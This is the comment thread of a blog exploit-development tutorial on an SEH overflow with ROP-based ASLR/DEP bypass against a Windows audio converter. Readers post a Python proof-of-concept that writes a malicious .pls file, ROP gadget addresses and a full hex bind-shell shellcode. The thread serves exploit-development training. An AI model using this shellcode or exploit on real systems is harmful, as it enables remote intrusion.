---
title: 'Bypassing ASLR and DEP on Windows 7: The Audio Converter Case'
date: 2014-02-09T10:15:00.000-08:00
draft: false
url: /2014/02/bypassing-aslr-and-dep-on-windows-7.html
---

#### 
[Anonymous]( "noreply@blogger.com") - <time datetime="2014-04-08T14:57:04.799-07:00">Apr 2, 2014</time>

This comment has been removed by a blog administrator.
<hr />
#### Email tekwizz123@gmail.com with your problem pleas...
[thetekwizz](https://www.blogger.com/profile/07021907186760706163 "noreply@blogger.com") - <time datetime="2014-04-08T15:01:20.441-07:00">Apr 2, 2014</time>

Email tekwizz123@gmail.com with your problem please. I am now going to delete your old comments as they are irrelevant to this post.
<hr />
#### When i to set the breakpoint (F2) in Stack Pivotin...
[Anonymous]( "noreply@blogger.com") - <time datetime="2014-07-17T07:48:53.266-07:00">Jul 4, 2014</time>

When i to set the breakpoint (F2) in Stack Pivoting - The Beginning of Our ROP Journey 0x1004C7A6, the program does not break it continues to execute. Any ideas?
<hr />
#### Have you checked your SEH chain? Do you see 1004C7...
[thetekwizz](https://www.blogger.com/profile/07021907186760706163 "noreply@blogger.com") - <time datetime="2014-07-17T08:04:39.823-07:00">Jul 4, 2014</time>

Have you checked your SEH chain? Do you see 1004C7A6 in the SEH chain at all? Verify the address is correct and then try single stepping through the program by pressing SHIFT + F7 once the program crashes (aka right after the exploit is sent) and see when you land. If all of this fails, try another address from that DLL file, it might help the situation? Your not restricted to just using that address :)
<hr />
#### If it still fails after all of that, then I'm ...
[thetekwizz](https://www.blogger.com/profile/07021907186760706163 "noreply@blogger.com") - <time datetime="2014-07-17T08:06:38.499-07:00">Jul 4, 2014</time>

If it still fails after all of that, then I'm happy to try give you a hand, but that should theoretically solve your problem.
<hr />
#### SEH chain of main thread Address SE handler 001...
[Anonymous]( "noreply@blogger.com") - <time datetime="2014-07-17T08:14:52.092-07:00">Jul 4, 2014</time>

SEH chain of main thread
Address SE handler
00104924 kernel32.76F29B62
0012DE04 audconv.00449F26
0012DF0C USER32.75A5629B
0012E04C USER32.75A5629B
0012E218 USER32.75A5629B
0012E358 USER32.75A5629B
0012E3B8 USER32.75A5629B
0012FE7C audconv.0044A1D6
0012FEB4 audconv.004362F0
0012FF78 audconv.004362F0
0012FFC4 ntdll.7709E115

I dont see the address in the SEH Chain, the above is in the SEH Chain after the crash
<hr />
#### Tried a few different addresses, no luck
[Anonymous]( "noreply@blogger.com") - <time datetime="2014-07-17T08:51:34.125-07:00">Jul 4, 2014</time>

Tried a few different addresses, no luck
<hr />
#### Can you paste the code that you are using? I don&#...
[thetekwizz](https://www.blogger.com/profile/07021907186760706163 "noreply@blogger.com") - <time datetime="2014-07-17T09:39:48.034-07:00">Jul 4, 2014</time>

Can you paste the code that you are using? I don't have the setup on me at present but I'll try see what error might be going on?
<hr />
#### #!/usr/bin/python junk = "A" \* 4432 nseh...
[Anonymous]( "noreply@blogger.com") - <time datetime="2014-07-17T09:53:51.506-07:00">Jul 4, 2014</time>

#!/usr/bin/python
junk = "A" \* 4432
nseh = "DDDD"
seh = "\\x2D\\xC8\\x04\\x10"
trigger = "C" \* (50000 - (len(junk) + len(seh)))
buffer = junk + nseh + seh + trigger

handle = open("audioExploitDemo.pls", "w")
handle.write(buffer)
handle.close()
<hr />
#### For that exploit are you placing a breakpoint at 0...
[thetekwizz](https://www.blogger.com/profile/07021907186760706163 "noreply@blogger.com") - <time datetime="2014-07-17T10:01:49.659-07:00">Jul 4, 2014</time>

For that exploit are you placing a breakpoint at 0x1004C82D? Another thing to try potentially would be to edit this line:

handle = open("audioExploitDemo.pls", "w")

to this:

handle = open("audioExploitDemo.pls", "wb")

and see if that works at all?
<hr />
#### Yep that address, according to your post it should...
[Anonymous]( "noreply@blogger.com") - <time datetime="2014-07-17T10:15:22.143-07:00">Jul 4, 2014</time>

Yep that address, according to your post it should be in the address space of the audconv.dll
and that ranges from 0x10000000 to 0x101c9000 so that address should be in there ??

"wb" Doesn't work, i added a bunch of address in immunity as break points, i can see that executions happen on the break points but it just keeps executing !!!
<hr />
#### Can you send an email to tekwizz123@gmail.com with...
[thetekwizz](https://www.blogger.com/profile/07021907186760706163 "noreply@blogger.com") - <time datetime="2014-07-17T11:46:55.479-07:00">Jul 4, 2014</time>

Can you send an email to tekwizz123@gmail.com with either a video of whats going on or Teamviewer/etc details and I can try help you out further. At the moment it seems like either the SEH chain is not being overwritten or your are not stepping through the execution of the program correctly and are missing something.
<hr />
#### sent email :)
[Anonymous]( "noreply@blogger.com") - <time datetime="2014-07-18T07:39:25.047-07:00">Jul 5, 2014</time>

sent email :)
<hr />
#### After running through your tutorial and successful...
[Anonymous]( "noreply@blogger.com") - <time datetime="2015-03-16T13:57:38.265-07:00">Mar 1, 2015</time>

After running through your tutorial and successfully getting it to work it seems like everything hinges on a DLL being compiled without SafeSEH. Does this exploit still get around ASLR if that particular DLL isn't opting in on that mitigation?

I will look into the ROP chain sequence a bit more later, but are we not ROP-ing into VirtualAlloc? Why is Windows not detecting the return into a critical function?

Awesome tutorial. Thanks.
<hr />
#### Considering this is an SEH overflow, yes we do hin...
[thetekwizz](https://www.blogger.com/profile/07021907186760706163 "noreply@blogger.com") - <time datetime="2015-03-18T05:18:57.362-07:00">Mar 3, 2015</time>

Considering this is an SEH overflow, yes we do hinge on the DLL being compiled without SafeSEH so we can use addresses from it within the SEH overflow. As for your question about ASLR, it would depend if ASLR is turned on for the DLL or not. In our case it is not so it does not matter if SafeSEH is turned on or not the DLL would still not be affected by ASLR (I think this is what you are asking, correct me if not)

And yes we are creating a ROP chain to call VirtualAlloc. As for why Windows is not detecting the call into a critical function, this is a good question. By default Windows won't detect the call however what you are talking about, the detection of returns into critical functions, has been implemented in protections within the EMET suite from Microsoft which ironically I have just recently finished researching (hence how I was able to pull that up out of the blue :) ) So yes the protection you mentioned does exist its just not implemented by default on Windows.
<hr />
#### Glad you enjoyed the tutorial though, let me know ...
[thetekwizz](https://www.blogger.com/profile/07021907186760706163 "noreply@blogger.com") - <time datetime="2015-03-18T05:19:24.564-07:00">Mar 3, 2015</time>

Glad you enjoyed the tutorial though, let me know if you have any additional questions :)
<hr />
#### Same issue here, how did you solve it ? There are ...
[Unknown](https://www.blogger.com/profile/04657343753439911763 "noreply@blogger.com") - <time datetime="2015-09-15T00:52:01.051-07:00">Sep 2, 2015</time>

Same issue here, how did you solve it ? There are two entries in SEH tables:
SEH chain of main thread
Address SE handler
0012CAB4 audcon\_1.10074100
0012DD58 audcon\_1.1008E5DB(overwrited by me, no safesah on dll)
44444444 \*\*\* CORRUPT ENTRY \*\*\*

But immunity says: access violation here:
1007E595 8806 MOV BYTE PTR DS:\[ESI\],

There are breakspoints here: 10074100 and here 1008E5DB but not working.
<hr />
#### My mistake, just press shıft +f7 and run
[Unknown](https://www.blogger.com/profile/04657343753439911763 "noreply@blogger.com") - <time datetime="2015-09-15T03:56:21.980-07:00">Sep 2, 2015</time>

My mistake, just press shıft +f7 and run
<hr />
#### Glad you managed to figure out a solution. SEH ove...
[thetekwizz](https://www.blogger.com/profile/07021907186760706163 "noreply@blogger.com") - <time datetime="2015-09-15T12:46:47.684-07:00">Sep 2, 2015</time>

Glad you managed to figure out a solution. SEH overflows are a bit different due to step through in the debugger due to the way the SEH exception handlers are utilized but you managed to figure it out in the end :)
<hr />
#### Hi, in your example, you chose a random address fr...
[Anonymous]( "noreply@blogger.com") - <time datetime="2019-05-25T03:28:25.788-07:00">May 6, 2019</time>

Hi, in your example, you chose a random address from audconv.dll (0x1004C7A6) which gives the stack adjustment offset of 0x8E0.
However, at the time when the breakpoint at 0x1004C7A6 was hit, the program has yet to raise SEH exception due to buffer overflow.
This means that ESP may still change during execution and hence the stack adjustment value of 0x8E0 is just a rough estimation, am I correct?
<hr />
#### I notice in your final exploit, you use the follow...
[Anonymous]( "noreply@blogger.com") - <time datetime="2019-06-02T00:52:52.761-07:00">Jun 0, 2019</time>

I notice in your final exploit, you use the following in your rop chain:
rop\_gadgets = \[
0x0043fb74, # POP ESI # RETN \[audconv.exe\]
0x0044b290, # ptr to &VirtualAlloc() \[IAT audconv.exe\]
0x0042fa37, # MOV EAX,DWORD PTR DS:\[ESI\] # RETN \[audconv.exe\]
But the gadgets have have 0x00 bytes. Would they work?
<hr />
#### So I think there is a bit of a misunderstanding he...
[thetekwizz](https://www.blogger.com/profile/07021907186760706163 "noreply@blogger.com") - <time datetime="2019-06-02T09:31:01.353-07:00">Jun 0, 2019</time>

So I think there is a bit of a misunderstanding here. We are overwriting the SEH handler with the address 0x1004C7A6. Therefore when an exception is triggered it will go ahead and call 0x1004C7A6.

This can be seen by us placing a breakpoint on the address 0x1004C7A6, waiting for it to be hit, and then examining the exception chain (believe this is View->Exception Chain in Immunity Debugger, or if your using WinDBG it is !exchain). You should see 0x1004C7A6 listed as the current SEH handler.

As a result of this no, the offset of 0x8E0 will not change, and we can tell this is not a rough estimation by looking at the exploit I created at that point: there is no intention NOP slide at that point.

With that being said I suppose given that \\x0C\\x0C translates in x86 to "OR AL,0xC" you could theoretically use that as a NOP slide if you wanted to, but this wasn't the original intention at that point in the exploit development process.
<hr />
#### So I think for this exploit NULL bytes weren't...
[thetekwizz](https://www.blogger.com/profile/07021907186760706163 "noreply@blogger.com") - <time datetime="2019-06-02T10:02:06.946-07:00">Jun 0, 2019</time>

So I think for this exploit NULL bytes weren't bad characters if I recall correctly. So these addresses were allowed. Otherwise I would have had to look for addresses in a different library and ensure there weren't any NULL bytes in the addresses I used.

You can also confirm this by looking at the original exploit: https://www.exploit-db.com/exploits/13763. If you look at the code you can see the author uses NULL bytes in quite a few places within the exploit.
<hr />
#### Your guide was pretty helpful, so thank you for pu...
[Anonymous]( "noreply@blogger.com") - <time datetime="2020-01-19T20:41:39.837-08:00">Jan 0, 2020</time>

Your guide was pretty helpful, so thank you for putting it together. However, I managed to get the shellcode for "cmd.exe" working but if I attempt to input shellcode for a simple windows\_shell\_reverse it throws an access violation (030B8B10)??? I filtered out badchars (and it seems there was alot of them?) Any hints?
<hr />
#### Its possible your shellcode may be above the total...
[thetekwizz](https://www.blogger.com/profile/07021907186760706163 "noreply@blogger.com") - <time datetime="2020-01-19T21:34:19.294-08:00">Jan 0, 2020</time>

Its possible your shellcode may be above the total number of characters which can fit into the space available for us to utilize. This would explain why a shorter shellcode such as a cmd.exe shellcode works but a longer one such as windows\_shell\_reverse doesn't.

I will admit that this post was done quite a while ago and the way I calculated the max allowed size for each part of the buffer wasn't the best. That being said it appears the max size for the shellcode for this exploit, given the way it is currently set up, is roughly 2,300 bytes. Anything larger than that will result in the exploit not working, so keep that in mind.

If the payload is still smaller than this, and you've verified that it is not being corrupted in memory, then its possible the payload itself may be altering things in some way, such as expanding itself in memory, that the exploit or target environment is not expecting, which may be causing your issues.

Overall I would say the best way would be to first verify if your payload is too big, then verify if its being copied into its entirety into memory (verify with a debugger), and then finally check if there is any weird behavior happening when the shellcode itself executes. If all that fails, try with a smaller/simpler shellcode.

Hope that helps!
<hr />
#### Hey thanks for the fast response!! Again, I really...
[Unknown](https://www.blogger.com/profile/17243613108993059996 "noreply@blogger.com") - <time datetime="2020-01-20T18:42:43.872-08:00">Jan 1, 2020</time>

Hey thanks for the fast response!! Again, I really have to thank you for being super helpful! I know this writeup was a while ago, I'm getting ready to take OSCE so I'm trying to get all the practice at this kind of stuff as I can. That said, what you're saying makes alot of sense (shellcode to large or mangled). I've been pulling my hair out trying to figure out whats been going on with it. I followed all of your steps and got it to work and then started working my way bag piece by piece modifying it (ie: choosing a different address for SEH that'd put me further or closer to buffer, just for practice and to understand how its working). Your shellcode seems to work perfectly, but I cannot get any other shellcode to function, even a simple windows/exec cmd="cmd.exe" (I used the full windows path). I'm going to try to trace all the shellcode in memory to see if it gets mangled but a few questions:

Whats the best way to find the size of shellcode you can throw?

I saw that you didn't have any badchars, or at least you didn't say there were for the shellcode you provided, but did you run into a problem with badchars?

Lastly, if you had this scenario where you had to gain a shell onto this box by just supplying a .pls file, given the shellcode/size issue, what would you try to do? (I'm trying to expand my thinking here)
<hr />
#### So for the best way to find size of shellcode you ...
[thetekwizz](https://www.blogger.com/profile/07021907186760706163 "noreply@blogger.com") - <time datetime="2020-01-20T20:28:47.446-08:00">Jan 1, 2020</time>

So for the best way to find size of shellcode you can input, I would just keep expanding the size of your input buffer, using some static value like "A" or something similar until one of the following scenarios happen:

1\. You start overwriting a different SEH handler.

OR

2\. You cause the program to crash in a way you aren't expecting.

OR

3\. You see that in memory your bytes are being cut off at some point (aka the program will not take in any more bytes, and instead cuts your input off at some point).


Basically if the behavior of the program changes in some way that is contrary to what you were hoping for, its probably a good sign that is your max buffer size. Only exception to this is maybe if you overwrite a different exception handler and are still able to gain control but thats really up to you and the program's behavior; it can cause you to loose control if your careless in your approach.

As for bad character's I'm looking at my earlier comments and the post again and it doesn't seem like there are any bad characters. If you want to check I would run it with the full range of characters from \\x00 to \\xFF, see if it fails to copy all of it into memory successfully, and then if it fails do 50% splits of the content until you find which is the bad character (so take first 50% of data, try see if that has a bad character; if so take the first 50% of the data you just sent, try it again, repeat if it errors until you find the bad character).

As for last question due to a variety of reasons I will not answer that question. All I can say is try draw out possible scenarios on a piece of paper and go through them one by one. You may surprise yourself with what you come up with if you keep an open mind :)
<hr />
#### tekwizz123, Well, after your advice I managed to ...
[Unknown](https://www.blogger.com/profile/16728702911641125677 "noreply@blogger.com") - <time datetime="2020-01-23T15:53:53.504-08:00">Jan 4, 2020</time>

tekwizz123,

Well, after your advice I managed to find some working bind shellcode:

#windows vista Sp1 bindport:28876
\\x31\\xC9\\x64\\x8B\\x71\\x30\\x8B\\x76\\x0C\\x8B\\x76\\x1C\\x8B\\x6E\\x08\\x8B
\\x7E\\x20\\x8B\\x36\\x38\\x4F\\x18\\x75\\xF3\\x6A\\x32\\x68\\x73\\x32\\x5F\\x33
\\x68\\x30\\x20\\x41\\x77\\x68\\x81\\x59\\xD3\\x62\\x89\\xE6\\xB5\\x03\\x29\\xCC
\\x29\\xCC\\x89\\xE7\\xD6\\xF3\\xAA\\x41\\x51\\x41\\x51\\x57\\x51\\x83\\xEF\\x2C
\\xA4\\x4F\\x8B\\x5D\\x3C\\x8B\\x5C\\x1D\\x78\\x01\\xEB\\x8B\\x4B\\x20\\x01\\xE9
\\x56\\x31\\xD2\\x42\\x8B\\x34\\x91\\x01\\xEE\\x31\\xC0\\xAC\\x34\\x71\\x28\\xC4
\\x3C\\x71\\x75\\xF7\\x3A\\x27\\x75\\xEB\\x5E\\x8B\\x4B\\x24\\x01\\xE9\\x0F\\xB7
\\x14\\x51\\x8B\\x4B\\x1C\\x01\\xE9\\x89\\xE8\\x03\\x04\\x91\\xAB\\x80\\x3E\\xD3
\\x75\\x08\\x8D\\x5E\\x05\\x53\\xFF\\xD0\\x57\\x95\\x80\\x3E\\x77\\x75\\xB1\\x5E
\\xAD\\xFF\\xD0\\xAD\\xFF\\xD0\\x95\\x81\\x2F\\xFE\\xFF\\x8F\\x33\\x6A\\x10\\x57
\\xAD\\x55\\xFF\\xD0\\x85\\xC0\\x74\\xF8\\x31\\xD2\\x52\\x68\\x63\\x6D\\x64\\x20
\\x8D\\x7C\\x24\\x38\\xAB\\xAB\\xAB\\xC6\\x47\\xE9\\x01\\x54\\x87\\x3C\\x24\\x57
\\x52\\x52\\x52\\xC6\\x47\\xEF\\x08\\x57\\x52\\x52\\x57\\x52\\xFF\\x56\\xE4\\x8B
\\x46\\xFC\\xEB\\xCD

I also was able to find additional shellcode for some download/exec. I'm not good enough yet to troubleshoot the initial msfvenom output shellcode to understand why its not working, but the other shellcode that does appear to work has all been xp/vista specific (I'm running win Vista x86, btw)
you were right, I dont think there were/are any badchars, but why would this shellcode work and not the others of similar size?

ps: I even tried adding additional breakpoints /xcc, to get it to stop within my shellcode but still not luck
<hr />
#### Hmm its possible that your other shellcode assumed...
[thetekwizz](https://www.blogger.com/profile/07021907186760706163 "noreply@blogger.com") - <time datetime="2020-01-23T16:27:10.906-08:00">Jan 4, 2020</time>

Hmm its possible that your other shellcode assumed certain things that were only available in Windows 7 and later, although I couldn't say without you providing some examples of things that didn't work.

Again hard to say, but if the shellcode wasn't working even with you inserting breakpoints I would most likely say it was some bad character or some bad input etc cause normally at the very least it should hit a breakpoint if you place a few before your shellcode. Not hitting breakpoints makes me think somehow the input got screwed up so badly that it wasn't even able to hit the shellcode. That being said I would also want to know if you still have EIP/RIP control after you insert the bad shellcode; if not that kind of confirms my theory that your shellcode is somehow malforming input in such a way that it is altering something. Whether that is a bad character, a shellcode length issue, or otherwise would then be best determined by starting with the first line, and slowly doing tests with an additional line being sent on each test, until the issue is repeated again. At that point you can start playing around and set the same amount of bytes to some known good character like \\x41 and then see if the issue repeats itself. If it doesn't you know its a bad character. If it still does, you know its a length issue, and you can try again with less characters.
<hr />
#### Thanks for your time and contribution. Following y...
[trying](https://www.blogger.com/profile/17192544622237434267 "noreply@blogger.com") - <time datetime="2020-05-13T09:15:34.991-07:00">May 3, 2020</time>

Thanks for your time and contribution. Following your write up,"Any address from the audconv.dll file will work though, I just chose a random one from within the DLL." What did you do do to list the available addresses to select from? Running !mona modules just showed one entry for audconv.dll the base address. On the next section, "If we double click on the current stack address in the lower right panel, we can see the offset that we need to adjust the stack by to get it to point to the start of our payload." I have the same values for the registers and the stack. When I double click the value on the stack it shows $ ==> and not $+8D4. Any thoughts on what I might be doing incorrectly? Thanks.
<hr />
#### Hi there :) Its been a looooooooong time since Im...
[thetekwizz](https://www.blogger.com/profile/07021907186760706163 "noreply@blogger.com") - <time datetime="2020-05-14T20:19:19.251-07:00">May 4, 2020</time>

Hi there :)

Its been a looooooooong time since Immunity Debugger was popular and supported, but I'll try answer the first question as best I can given that its no longer installing successfully on Windows 10.

For the first question, I simply viewed the address space of the module in question, in this case audconv.dll, by browsing to View->Modules. I believe this should show you the start and end address of each module in the list. Otherwise you can always use WinDBG, start the program, then pause it in the debugger and list all modules that are loaded with "lm" (sans the quotes) to view their starting and ending addresses.

As for the second question, thats a good one I may have explained that wrong. Double clicking on an address on the stack will show ==>. This indicates "hey, this is your starting address, I'm now showing you everything relative to this address". So if double click on your current stack address, which should be the same value as is in ESP, in the stack view window, then you can see the distance from ESP to any other value on the stack. After I performed that step I then scrolled down in the stack view to see what was at the address 0x8D4 bytes later in memory than ESP. The stack view updated to reflect this by showing that address a $+8D4, aka 0x8D4 bytes past what you selected, which in this case was the address where ESP current points on the stack.
<hr />
#### Thanks for the clarification.
[trying](https://www.blogger.com/profile/17192544622237434267 "noreply@blogger.com") - <time datetime="2020-05-15T18:41:30.702-07:00">May 5, 2020</time>

Thanks for the clarification.
<hr />
